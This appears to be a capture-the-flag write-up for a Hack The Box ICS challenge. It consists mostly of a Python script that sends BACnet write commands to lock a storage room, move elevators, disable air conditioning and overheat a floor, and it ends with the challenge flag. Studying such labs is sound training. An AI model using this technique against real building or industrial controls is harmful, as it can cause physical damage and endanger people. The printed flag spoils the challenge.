---
layout: post
title:  "Steel Mountain"
date:   2026-06-17
description: "Steel Mountain is a secure facility serving major corporations like E-Corp. We've infiltrated their network and planted our tool. Final step: Burn the tapes to destroy the data. All necessary info is in the files."
author: "OakTree"
categories: writeups
---

<h2> This is a Medium Hack The Box challenge from the ICS category </h2>

<p> "Steel Mountain is a secure facility serving major corporations like E-Corp. We've infiltrated their network and planted our tool. Final step: Burn the tapes to destroy the data. All necessary info is in the files." </p>

```python
#! /bin/python
import socket
import json

# Format to write:  object_type object_id property_name value
# multiStateOutput 102 presentValue 2  <= {Lock tape storage room on Level 2}
# analogOutput 82 presentValue 1       <= {Tet Target Floor (TF) of elevator 1 at floor 1}
# analogOutput 85 presentValue 1       <= {Set Target Floor (TF) of elevator 2 at floor 1}
# analogOutput 23 presentValue 50      <= {Keep Over Heat (OH) alarm perpetually at 50}
# binaryOutput 22 presentValue 0       <= {Turn off air conditioning on Level 2}
# analogOutput 21 presentValue 40      <= {Set temperature on Level 2 to 40°C}    

commands = ["multiStateOutput 102 presentValue 2","analogOutput 82 presentValue 1","analogOutput 85 presentValue 1","analogOutput 23 presentValue 50","binaryOutput 22 presentValue 0","analogOutput 21 presentValue 40"]

SERVER_ADDRESS = "IP_ADDRESS:PORT".split(":")
SERVER_IP_PORT = (SERVER_ADDRESS[0], int(SERVER_ADDRESS[1]))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
    mysocket.connect(SERVER_IP_PORT)
    
    count = 0
    # Perpetually send commands in rotation to ensure all necessary criteria remain fulfilled.
    while True:
        if count == len(commands):
            count = 0
        payload = mysocket.recv(2048).decode('utf-8')

        # When data contains the '3. bacnet.write' option, we know we are able to request a write operation.
        if '3. bacnet.write' in payload:
            message = "3"
            mysocket.send(f"{message}\r\n".encode())

        # When the write operation has been requested, send the command after the usage prompt appears.
        elif 'object_type object_id property_name value' in payload:
            message = commands[count]
            mysocket.send(f"{message}\r\n".encode())
            count+=1

# FLAG: HTB{b4cn3t_!5_Fun_4nd_D4nger0u5}   
```